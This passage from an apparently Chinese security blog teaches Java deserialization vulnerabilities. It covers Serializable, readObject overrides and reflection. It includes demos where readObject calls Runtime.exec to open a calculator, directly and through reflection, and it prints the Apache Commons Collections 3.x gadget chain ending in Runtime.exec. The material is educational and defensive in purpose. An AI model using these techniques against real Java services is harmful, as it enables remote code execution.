    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%B8%80-%E4%BB%8ESerializbale%E6%8E%A5%E5%8F%A3%E5%BC%80%E5%A7%8B%E5%85%88%E5%BC%B9%E4%B8%80%E4%B8%AA%E8%AE%A1%E7%AE%97%E5%99%A8/</url>
    <content><![CDATA[<h3 id="0x0、基本概念"><a href="#0x0、基本概念" class="headerlink" title="0x0、基本概念"></a>0x0、基本概念</h3><p><strong>1、什么是序列化和反序列化</strong></p>
<p>Serialization（序列化）是指把Java对象保存为二进制字节码的过程；反序列化deserialization是把二进制码重新转换成Java对象的过程。</p>
<p><strong>2、什么情况下需要序列化</strong></p>
<p>a）当你想把的内存中的对象保存到一个文件中或者数据库中时候；</p>
<p>b）当你想用套接字在网络上传送对象的时候；</p>
<p>c）当你想通过RMI传输对象的时候；</p>
<p>总之，序列化的用途就是传递和存储。</p>
<p><strong>3、如何实现序列化</strong></p>
<p>将需要序列化的类实现Serializable接口就可以了，Serializable接口中没有任何方法，可以理解为一个标记，即表明这个类可以被序列化。</p>
<p>序列化与反序列化都可以理解为“写”和“读”操作 ，通过如下这两个方法可以将对象实例进行“序列化”与“反序列化”操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 写入对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void writeObject(java.io.ObjectOutputStream out)</span><br><span class="line"></span><br><span class="line">&#x2F;**</span><br><span class="line"></span><br><span class="line"> * 读取对象内容</span><br><span class="line"></span><br><span class="line"> *&#x2F;</span><br><span class="line"></span><br><span class="line">private void readObject(java.io.ObjectInputStream in)﻿</span><br></pre></td></tr></table></figure>

<p><strong>4、一些注意点</strong></p>
<p>当然，并不是一个实现了序列化接口的类的所有字段及属性，都是可以序列化的：</p>
<p>如果该类有父类，则分两种情况来考虑：</p>
<p>1.如果该父类已经实现了可序列化接口，则其父类的相应字段及属性的处理和该类相同；</p>
<p>2.如果该类的父类没有实现可序列化接口，则该类的父类所有的字段属性将不会序列化，并且反序列化时会调用父类的默认构造函数来初始化父类的属性，而子类却不调用默认构造函数，而是直接从流中恢复属性的值。</p>
<p>如果该类的某个属性标识为static类型的，则该属性不能序列化。</p>
<p>如果该类的某个属性采用transient关键字标识，则该属性不能序列化。</p>
<p>a）当一个父类实现序列化，子类自动实现序列化，不需要显式实现Serializable接口；</p>
<p>b）当一个对象的实例变量引用其他对象，序列化该对象时也把引用对象进行序列化；</p>
<h3 id="0x1、简单实例"><a href="#0x1、简单实例" class="headerlink" title="0x1、简单实例"></a>0x1、简单实例</h3><p>以下代码是一个简单的序列化和反序列化操作的demo。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest x &#x3D; new deserTest(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e) &#123;</span><br><span class="line">            &#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255836.png" alt="img"></p>
<h3 id="0x2、自定义反序列化的行为–弹个计算器"><a href="#0x2、自定义反序列化的行为–弹个计算器" class="headerlink" title="0x2、自定义反序列化的行为–弹个计算器"></a>0x2、自定义反序列化的行为–弹个计算器</h3><p>自定义序列化和反序列化过程，就是重写writeObject和readObject方法。</p>
<p>对以上代码进行改造，加入readObject方法的重写，再重写函数中加入自己的代码逻辑。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line"></span><br><span class="line">public class deserTest2 implements Serializable &#123;	</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public deserTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;deserTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		in.defaultReadObject();</span><br><span class="line">		Runtime.getRuntime().exec(&quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		System.out.println(&quot;test&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			deserTest2 x &#x3D; new deserTest2(5);</span><br><span class="line">			operation1.ser(x);</span><br><span class="line">			operation1.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation1&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>







<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014255733.png" alt="img"></p>
<p>总结：</p>
<p>这是一个极端的例子，在真实场景中，不会有人真的这样直接写一句执行命令的代码在readObject()中。但是一般会有其他的代码逻辑，如果它的代码逻辑里，如果有某一个分支有像method.invoke()这种可以调用其他函数的代码，那么就可以跳转过去，再从这个“其他函数”的角度去看有没有执行代码或调用其他函数的可能。这个“其他函数”也就是所谓的gadget了。</p>
<p>参考：</p>
<p><a href="http://www.cnblogs.com/xdp-gacl/p/3777987.html">http://www.cnblogs.com/xdp-gacl/p/3777987.html</a></p>
<p><a href="http://www.importnew.com/20125.html">http://www.importnew.com/20125.html</a></p>
<p><a href="http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua">http://beautyboss.farbox.com/post/study/shen-ru-xue-xi-javaxu-lie-hua</a></p>
]]></content>
      <categories>
        <category>反序列化</category>
      </categories>
      <tags>
        <tag>java反序列化</tag>
      </tags>
  </entry>
  <entry>
    <title>Java反序列化漏洞学习实践二-Java的反射机制（Java Reflection）</title>
    <url>/2020/09/13/WEB/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E5%AE%9E%E8%B7%B5%E4%BA%8C-Java%E7%9A%84%E5%8F%8D%E5%B0%84%E6%9C%BA%E5%88%B6%EF%BC%88Java-Reflection%EF%BC%89/</url>
    <content><![CDATA[<p>学习Java的反射机制是为了理解Apache Commons Collections中的反序列化漏洞做准备的。</p>
<h3 id="0x0、基础"><a href="#0x0、基础" class="headerlink" title="0x0、基础"></a>0x0、基础</h3><p><strong>Java反射机制</strong></p>
<ul>
<li>指的是可以于运行时加载,探知和使用编译期间完全未知的类.</li>
<li>程序在运行状态中, 可以动态加载一个只有名称的类, 对于任意一个已经加载的类,都能够知道这个类的所有属性和方法; 对于任意一个对象,都能调用他的任意一个方法和属性;</li>
<li>加载完类之后, 在堆内存中会产生一个Class类型的对象(一个类只有一个Class对象), 这个对象包含了完整的类的结构信息,而且这个Class对象就像一面镜子,透过这个镜子看到类的结构,所以被称之为:反射.</li>
<li>每个类被加载进入内存之后,系统就会为该类生成一个对应的java.lang.Class对象,通过该Class对象就可以访问到JVM中的这个类.</li>
</ul>
<p><strong>Class对象的获取方法</strong></p>
<ul>
<li>实例对象的getClass()方法;</li>
<li>类的.class(最安全/性能最好)属性;（如demo代码和下图）</li>
<li>运用Class.forName(String className)动态加载类,className需要是类的全限定名(最常用).</li>
</ul>
<p>注意，有一点很有趣，使用功能”.class”来创建Class对象的引用时，不会自动初始化该Class对象，使用forName()会自动初始化该Class对象</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329604.png" alt="img"></p>
<h3 id="0x1、通过反射方法调用函数"><a href="#0x1、通过反射方法调用函数" class="headerlink" title="0x1、通过反射方法调用函数"></a>0x1、通过反射方法调用函数</h3><p>该demo主要实践学习使用反射方法来调用类中的函数。</p>
<p>``</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest &#123;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">		try&#123;</span><br><span class="line">			&#x2F;&#x2F;Class 获取类的方法一：事例化对象的getclass()方法；</span><br><span class="line">			User testObject &#x3D; new User(&quot;zhangsan&quot;,19);</span><br><span class="line">			Class Method1Class &#x3D; testObject.getClass();</span><br><span class="line">			</span><br><span class="line">			&#x2F;&#x2F;Class获取类的方法二：类的.Class(最安全&#x2F;性能最好)属性;有点类似python的getattr()。java中每个类型都有class属性。</span><br><span class="line">			Class method2Class &#x3D; User.class;</span><br><span class="line">		</span><br><span class="line">			&#x2F;&#x2F;Class对象的获取方法三：运用Class.forName(String className)动态加载类，className需要是类的全限定名（最常用）</span><br><span class="line">			&#x2F;&#x2F;这种方法也最容易理解，通过类名（jar包中的完整namespace）就可以调用其中方法，也最符合我们需要的使用场景</span><br><span class="line">			&#x2F;&#x2F;j2eeScan burp 插件就使用了这种反射机制</span><br><span class="line">			String path &#x3D; &quot;反序列化2.User&quot;;</span><br><span class="line">			Class method3Class &#x3D; Class.forName(path);</span><br><span class="line">			</span><br><span class="line">			Method[] methods &#x3D; method3Class.getMethods();</span><br><span class="line">			 </span><br><span class="line">			&#x2F;&#x2F;通过类的class属性获取对应的Class类的对象，通过这个Class类的对象获取test类中的方法集合</span><br><span class="line">		</span><br><span class="line">		    &#x2F;* String name &#x3D; Method3Class.getName();</span><br><span class="line">		     * int modifiers &#x3D; Method3Class.getModifiers();</span><br><span class="line">		     * .....还有很多方法</span><br><span class="line">		     * 也就是说，对于一个任意的可以访问到的类，我们都能够通过以上这些方法来知道它的所有的方法和属性；</span><br><span class="line">		     * 知道了它的方法和属性，就可以调用这些方法和属性。</span><br><span class="line">		     *&#x2F;</span><br><span class="line">		</span><br><span class="line">		    &#x2F;&#x2F;调用User类中的方法</span><br><span class="line">			</span><br><span class="line">			for(Method method: methods) &#123;</span><br><span class="line">				if(method.getName().equals(&quot;getName&quot;)) &#123;</span><br><span class="line">					System.out.println(&quot;method &#x3D; &quot; + method.getName());</span><br><span class="line">					Class[] parameterTypes &#x3D; method.getParameterTypes(); &#x2F;&#x2F;获取方法的参数</span><br><span class="line">					Class returnType &#x3D; method.getReturnType(); &#x2F;&#x2F;获取方法的返回类型</span><br><span class="line">					try &#123;</span><br><span class="line">						User user &#x3D; (User)method3Class.newInstance();</span><br><span class="line">						Object x  &#x3D; method.invoke(user);  &#x2F;&#x2F;user.getName;</span><br><span class="line">						&#x2F;&#x2F;Object x &#x3D; method.invoke(new test(1), 666);</span><br><span class="line">			            &#x2F;&#x2F;new关键字能调用任何构造方法,newInstance()只能调用无参构造方法。但反射的场景中是不应该有机会使用new关键词的。</span><br><span class="line">			            System.out.println(x);</span><br><span class="line">					&#125; catch (Exception e) &#123;</span><br><span class="line">						&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">						e.printStackTrace();</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">			</span><br><span class="line">			Method method1 &#x3D; method3Class.getMethod(&quot;setName&quot;, String.class);</span><br><span class="line">			User user1 &#x3D; (User)method3Class.getConstructor(String.class,Integer.class).newInstance(&quot;lisi&quot;,19);</span><br><span class="line">			&#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">			Object x &#x3D; method1.invoke(user1, &quot;李四&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二个参数是函数的参数</span><br><span class="line">			System.out.println(user1.getName());</span><br><span class="line">			&#125;catch(Exception e) &#123;</span><br><span class="line">				e.printStackTrace();</span><br><span class="line">			&#125;</span><br><span class="line">		</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User&#123;</span><br><span class="line">	private Integer age;</span><br><span class="line">	private String name;</span><br><span class="line">	</span><br><span class="line">	public User() &#123;&#125;;</span><br><span class="line">	public User(String name,Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line">	public Integer getAge() &#123;</span><br><span class="line">		return age;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setAge(Integer age) &#123;</span><br><span class="line">		this.age &#x3D; age;</span><br><span class="line">	&#125;</span><br><span class="line">	public String getName() &#123;</span><br><span class="line">		return name;</span><br><span class="line">	&#125;</span><br><span class="line">	public void setName(String name) &#123;</span><br><span class="line">		this.name &#x3D; name;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;﻿</span><br></pre></td></tr></table></figure>

<p><img src="https://leanote.com/api/file/getImage?fileId=5f34e912ab644156ad000813" alt="img"></p>
<h3 id="0x2、通过反射方法弹个计算器"><a href="#0x2、通过反射方法弹个计算器" class="headerlink" title="0x2、通过反射方法弹个计算器"></a>0x2、通过反射方法弹个计算器</h3><p>step1中，我们通过重写readObject方法，直接在里面使用Runtime.getRuntime().exec(“calc.exe”)来执行代码。现在需要改造一下，使用反弹方法来实现，成功调试的代码如下。<code>1</code>1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.io.FileInputStream;</span><br><span class="line">import java.io.FileNotFoundException;</span><br><span class="line">import java.io.FileOutputStream;</span><br><span class="line">import java.io.IOException;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.io.Serializable;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">public class reflectionTest2 implements Serializable&#123;</span><br><span class="line">	&#x2F;&#x2F;创建一个简单的可被序列化的类，它的实例化后的对象就是可以被序列化的</span><br><span class="line">	private static final long serialVersionUID &#x3D; 1L;</span><br><span class="line">	private int n;</span><br><span class="line">	public reflectionTest2(int n) &#123;</span><br><span class="line">		this.n&#x3D;n;</span><br><span class="line">	&#125;</span><br><span class="line">	@Override</span><br><span class="line">	public String toString() &#123;</span><br><span class="line">		return &quot;reflectionTest2 [n&#x3D;&quot; + n + &quot;, getClass()&#x3D;&quot; + getClass() + &quot;, hashCode()&#x3D;&quot; + hashCode() + &quot;, toString()&#x3D;&quot;</span><br><span class="line">				+ super.toString() + &quot;]&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">	private void readObject(java.io.ObjectInputStream in) throws IOException,ClassNotFoundException&#123;</span><br><span class="line">		try &#123;</span><br><span class="line">			Method method &#x3D; java.lang.Runtime.class.getMethod(&quot;exec&quot;, String.class);</span><br><span class="line">			Object result &#x3D; method.invoke(Runtime.getRuntime(), &quot;open &#x2F;System&#x2F;Applications&#x2F;Calculator.app&quot;);</span><br><span class="line">		&#125; catch (Exception e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void main(String[] args) &#123;</span><br><span class="line">			reflectionTest2 x &#x3D; new reflectionTest2(5);</span><br><span class="line">			operation.ser(x);</span><br><span class="line">			operation.deser();</span><br><span class="line">			x.toString();</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class operation&#123;</span><br><span class="line">	public static void ser(Object obj) &#123;</span><br><span class="line">		&#x2F;&#x2F;序列化操作，写操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectOutputStream ooStream &#x3D; new ObjectOutputStream(new FileOutputStream(&quot;object.obj&quot;));</span><br><span class="line">			&#x2F;&#x2F;ObjectOutputStream能把Object输出成Byte流</span><br><span class="line">			ooStream.writeObject(obj);</span><br><span class="line">			ooStream.flush();</span><br><span class="line">			ooStream.close();</span><br><span class="line">			</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	public static void deser() &#123;</span><br><span class="line">		&#x2F;&#x2F;反序列化，读取操作</span><br><span class="line">		try &#123;</span><br><span class="line">			ObjectInputStream iiStream &#x3D; new ObjectInputStream(new FileInputStream(&quot;object.obj&quot;));</span><br><span class="line">			Object xObject &#x3D; iiStream.readObject();</span><br><span class="line">			System.out.println(xObject);</span><br><span class="line">			iiStream.close();</span><br><span class="line">		&#125; catch (FileNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;catch (IOException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO: handle exception</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125; catch (ClassNotFoundException e) &#123;</span><br><span class="line">			&#x2F;&#x2F; TODO Auto-generated catch block</span><br><span class="line">			e.printStackTrace();</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p>执行结果：</p>
<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014329684.png" alt="img"></p>
<h3 id="0x3、通过setAccessible访问私有属性和函数"><a href="#0x3、通过setAccessible访问私有属性和函数" class="headerlink" title="0x3、通过setAccessible访问私有属性和函数"></a>0x3、通过setAccessible访问私有属性和函数</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">﻿package 反序列化2;</span><br><span class="line"></span><br><span class="line">import java.lang.reflect.Constructor;</span><br><span class="line">import java.lang.reflect.Method;</span><br><span class="line">&#x2F;*</span><br><span class="line"> * 测试setAccessible方法，可以通过将它设置为true--setAccessible(true) 来访问private属性和函数。</span><br><span class="line"> * 而且可以提高程序的执行效率，因为减少了安全检查。</span><br><span class="line"> *&#x2F;</span><br><span class="line">public class reflectionTest3 &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args)&#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            String path &#x3D; &quot;反序列化2.User3&quot;; </span><br><span class="line">            Class clazz &#x3D; Class.forName(path);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Method method &#x3D; clazz.getMethod(&quot;setName&quot;,String.class);</span><br><span class="line">            &#x2F;&#x2F;getMethod只能获取public的方法，private的方法需要使用getDeclaredMethod来获取，并且设置setAccessible(true)才可以调用访问。</span><br><span class="line">            &#x2F;&#x2F;参数属性也是一样。</span><br><span class="line">            Method method &#x3D; clazz.getDeclaredMethod(&quot;setName&quot;, String.class);</span><br><span class="line">            method.setAccessible(true);</span><br><span class="line"></span><br><span class="line">            &#x2F;&#x2F;Constructor strut &#x3D; clazz.getConstructor(String.class,Integer.class);</span><br><span class="line">            &#x2F;&#x2F;getConstructor只能获取public的构造方法</span><br><span class="line">            Constructor strut &#x3D; clazz.getDeclaredConstructor(String.class,Integer.class);</span><br><span class="line">            strut.setAccessible(true);</span><br><span class="line">            User3 user &#x3D; (User3)strut.newInstance(&quot;bit4&quot;,19);</span><br><span class="line">            &#x2F;&#x2F;调用自定义构造器的方法</span><br><span class="line">            Object x &#x3D; method.invoke(user,&quot;比特&quot;);&#x2F;&#x2F;第一个参数是类的对象。第二参数是函数的参数</span><br><span class="line">            System.out.println(user.getName());</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125; catch (Exception e1) &#123;</span><br><span class="line">            e1.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class User3&#123;</span><br><span class="line"></span><br><span class="line">    private Integer age;</span><br><span class="line">    private String name;</span><br><span class="line"></span><br><span class="line">    private User3() &#123;&#125;</span><br><span class="line"></span><br><span class="line">    private User3(String name,Integer age)&#123; &#x2F;&#x2F;构造函数，初始化时执行</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    private Integer getAge() &#123;</span><br><span class="line">        return age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setAge(Integer age) &#123;</span><br><span class="line">        this.age &#x3D; age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public String getName() &#123;</span><br><span class="line">        return name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    private void setName(String name) &#123;</span><br><span class="line">        this.name &#x3D; name;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/getImage-20200913014328752.png" alt="img"></p>
<h3 id="0x4、思考总结"><a href="#0x4、思考总结" class="headerlink" title="0x4、思考总结"></a>0x4、思考总结</h3><p>程序的两大根本：变量与函数</p>
<p><em>所以总的来说，要想控制程序实现命令执行，有2个方向</em>：</p>
<p>1.控制代码、函数：就像命名注入等注入类漏洞一样数据被当作了代码执行；或者和上面的demo代码一样重写readObject，加入自定义的代码（当然这种场景基本不存在，任意文件上传和执行勉强算是属于这种情况）。</p>
<p>2.控制输入、数据、变量：利用代码中已有的函数和逻辑，通过改变输入内容的形态实现流程的控制（不同的输入会走不同的逻辑流程，执行不同代码块中的代码）。</p>
<p><em>对于java反序列化漏洞，属于控制数据输入，它有2个基本点必须要满足</em>：</p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的（由于不存在代码注入，只能查找已有代码逻辑中是否有这样的类）。</p>
<p>2.在重写的readObject()方法的逻辑中有 method.invoke函数出现，而且参数可控。</p>
<p><em>再稍作抽象：</em></p>
<p>1.有一个可序列化的类，并且该类是重写了readObject()方法的，除了默认的对象读取外，还有其他处理逻辑。（主线流程，反序列化漏洞都是这个主线逻辑流程，这是反序列化漏洞的入口点。）</p>
<p>2..在重写的readObject()方法的逻辑中有 直接或间接使用类似method.invoke这种可以执行调用任意方法的函数，而且参数可控。（是否还有其他函数可以达到相同的目的呢？）</p>
<p>Apache Commons Collections 3.x 版本的 Gadget 构造过程 就是典型的例子。它的调用链如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;*</span><br><span class="line">    Gadget chain:</span><br><span class="line">        ObjectInputStream.readObject()</span><br><span class="line">            AnnotationInvocationHandler.readObject()</span><br><span class="line">                AbstractInputCheckedMapDecorator$MapEntry.setValue()</span><br><span class="line">                    TransformedMap.checkSetValue()</span><br><span class="line">                        ConstantTransformer.transform()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Class.getMethod()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.getRuntime()</span><br><span class="line">                        InvokerTransformer.transform()</span><br><span class="line">                            Method.invoke()</span><br><span class="line">                                Runtime.exec()</span><br><span class="line"></span><br><span class="line">    Requires:</span><br><span class="line">        commons-collections &lt;&#x3D; 3.2.1</span><br><span class="line">*&#x2F;﻿</span><br></pre></td></tr></table></figure>



<p>参考：</p>
